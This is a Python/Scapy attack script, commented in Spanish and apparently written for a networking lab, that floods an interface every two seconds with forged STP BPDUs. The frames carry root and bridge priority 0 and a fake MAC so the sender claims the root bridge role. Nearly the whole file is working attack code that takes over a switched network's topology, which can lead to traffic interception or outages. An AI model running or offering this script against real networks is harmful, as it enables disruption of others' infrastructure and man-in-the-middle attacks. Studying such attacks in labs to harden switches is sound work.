#!/usr/bin/env python3
# Script: JordyRosario_20250737_STP_Claim_Root.py

import sys
import time
from scapy.all import *

def lanzar_stp_root_claim(interfaz):
    print(f"[*] Iniciando ataque STP Root Claim en la interfaz {interfaz}")
    print("[*] Inyectando BPDUs con prioridad 0 para usurpar la topología...")
    print("[*] Presiona Ctrl+C para detener el ataque.")
    
    mac_multicast_stp = "01:80:c2:00:00:00"
    
    mac_falsa_atacante = "00:00:00:00:00:01"
    
    try:
        while True:
            # 1. Capa Ethernet
            capa_ethernet = Ether(dst=mac_multicast_stp, src=get_if_hwaddr(interfaz))
            
            # 2. Capa LLC requerida por el estándar 802.1D
            capa_llc = LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
            
            # 3. Capa STP: rootid=0 y bridgeid=0 garantizan la máxima prioridad
            capa_stp = STP(
                bpdutype=0x00, 
                bpduflags=0x00, 
                rootid=0, 
                rootmac=mac_falsa_atacante, 
                bridgeid=0, 
                bridgemac=mac_falsa_atacante, 
                portid=0x8002
            )
            
            paquete_bpdu = capa_ethernet / capa_llc / capa_stp
            
            # Enviar paquete
            sendp(paquete_bpdu, iface=interfaz, verbose=False)
            
            # STP requiere que los BPDUs se envíen cada 2 segundos (Hello Time)
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[+] Ataque STP detenido por el usuario. La red convergerá a la normalidad en breve.")

if __name__ == "__main__":
    interfaz_red = "eth0"
    if len(sys.argv) > 1:
        interfaz_red = sys.argv[1]
        
    lanzar_stp_root_claim(interfaz_red)